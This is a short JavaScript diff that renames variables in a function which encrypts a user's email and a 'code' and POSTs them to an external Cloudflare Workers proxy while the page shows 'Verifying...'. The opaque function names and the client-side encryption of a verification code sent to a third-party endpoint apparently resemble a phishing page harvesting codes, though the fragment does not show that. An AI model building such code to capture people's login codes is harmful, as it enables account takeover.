@@ -93,9 +93,9 @@ function falcon() {
   spinner.style.display = "block";
   btnText.innerText = "Verifying...";
   const encoded = encryptPayload({
-    email: viper,
-    code: cobra,
-    timestamp: Date.now(),
+    email: email,
+    code: code,
+    timestamp: Date.now()
   });
   fetch("https://rum-email-proxy.haricoting.workers.dev/contact", {
     method: "POST",
